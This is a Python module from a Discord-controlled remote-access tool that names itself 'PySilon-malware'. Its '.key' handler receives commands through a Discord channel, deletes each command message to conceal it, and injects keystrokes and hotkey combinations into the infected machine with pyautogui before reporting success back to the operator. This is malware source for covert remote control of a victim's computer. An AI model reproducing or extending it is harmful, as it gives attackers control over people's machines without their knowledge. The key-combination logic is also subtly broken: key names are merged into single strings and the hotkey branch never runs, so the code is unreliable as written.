import pyautogui
import re
import asyncio
import discord

# Define the mapping of keys
key_mapping = {
    'SHIFT': 'shift',
    'WINDOWS': 'winleft',
    'ALT': 'alt',
    'CTRL': 'ctrl',
    'ESC': 'esc',
    'TAB': 'tab',
    'CAPSLOCK': 'capslock',
    'SPACE': 'space',
    'ENTER': 'enter',
    'BACKSPACE': 'backspace',
    'INSERT': 'insert',
    'DELETE': 'delete',
    'HOME': 'home',
    'END': 'end',
    'PAGEUP': 'pageup',
    'PAGEDOWN': 'pagedown',
    'UP': 'up',
    'DOWN': 'down',
    'LEFT': 'left',
    'RIGHT': 'right',
    'F1': 'f1',
    'F2': 'f2',
    'F3': 'f3',
    'F4': 'f4',
    'F5': 'f5',
    'F6': 'f6',
    'F7': 'f7',
    'F8': 'f8',
    'F9': 'f9',
    'F10': 'f10',
    'F11': 'f11',
    'F12': 'f12',
    'a': 'a',
    'b': 'b',
    'c': 'c',
    'd': 'd',
    'e': 'e',
    'f': 'f',
    'g': 'g',
    'h': 'h',
    'i': 'i',
    'j': 'j',
    'k': 'k',
    'l': 'l',
    'm': 'm',
    'n': 'n',
    'o': 'o',
    'p': 'p',
    'q': 'q',
    'r': 'r',
    's': 's',
    't': 't',
    'u': 'u',
    'v': 'v',
    'w': 'w',
    'x': 'x',
    'y': 'y',
    'z': 'z',
    'A': 'A',
    'B': 'B',
    'C': 'C',
    'D': 'D',
    'E': 'E',
    'F': 'F',
    'G': 'G',
    'H': 'H',
    'I': 'I',
    'J': 'J',
    'K': 'K',
    'L': 'L',
    'M': 'M',
    'N': 'N',
    'O': 'O',
    'P': 'P',
    'Q': 'Q',
    'R': 'R',
    'S': 'S',
    'T': 'T',
    'U': 'U',
    'V': 'V',
    'W': 'W',
    'X': 'X',
    'Y': 'Y',
    'Z': 'Z',
    '0': '0',
    '1': '1',
    '2': '2',
    '3': '3',
    '4': '4',
    '5': '5',
    '6': '6',
    '7': '7',
    '8': '8',
    '9': '9',
    '`': '`',
    '-': '-',
    '=': '=',
    '[': '[',
    ']': ']',
    '\\': '\\',
    ';': ';',
    "'": "'",
    ',': ',',
    '.': '.',
    '/': '/',
    'NUMLOCK': 'numlock',
    'SCROLLLOCK': 'scrolllock',
    'PAUSE': 'pause',
    'PRINTSCREEN': 'printscreen',
}

syntax_guide = """
Syntax: .key <keys-to-press-or-text>

Examples:

Pressing Keys:
.key "ALT" "TAB": Simulates pressing ALT and TAB keys simultaneously.
.key "CTRL" "SHIFT" "ESC": Simulates pressing CTRL, SHIFT, and ESC keys simultaneously.

Typing Text:
.key Hello World: Types Hello World.
.key This is a test: Types This is a test.

Combination of Keys and Text:
.key "ALT" "TAB" Hello World: Simulates pressing ALT and TAB keys simultaneously, then types "Hello World".
.key "CTRL" "SHIFT" "ESC" This is a test: Simulates pressing CTRL, SHIFT, and ESC keys simultaneously, then types This is a test.
"""


async def handle_key_command(message):
    await message.delete()
    keys_text = message.content[len('.key'):].strip()
    key_combinations = []

    # Use regular expression to find keys within double quotes
    keys_within_quotes = re.findall(r'"([^"]*)"', keys_text)

    # Remove keys within quotes from the original string
    keys_text = re.sub(r'"([^"]*)"', '', keys_text)

    # Split the remaining text by space to get individual keys
    remaining_keys = keys_text.split()

    # Process keys within quotes
    for keys in keys_within_quotes:
        key_combinations.append(''.join([key_mapping[key.upper()] for key in keys.split()]))

    # Process remaining keys (treated as text)
    for key in remaining_keys:
        if key.upper() in key_mapping:
            key_combinations.append(key_mapping[key.upper()])
        else:
            key_combinations.append(key)

    # Generate all possible combinations of 3 keys
    for i in range(len(key_combinations) - 2):
        key_combo = key_combinations[i:i + 3]
        # Check if the key combination contains keys only or text only
        if all(isinstance(item, str) for item in key_combo):
            pyautogui.typewrite(''.join(key_combo))
        else:
            pyautogui.hotkey(*key_combo)  # Unpack the list and pass as arguments to pyautogui.hotkey()

    embed = discord.Embed(title="🟢 Success", description=f'```All keys have been successfully pressed```', colour=discord.Colour.green())
    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
    reaction_msg = await message.channel.send(embed=embed)
    await reaction_msg.add_reaction('🔴')
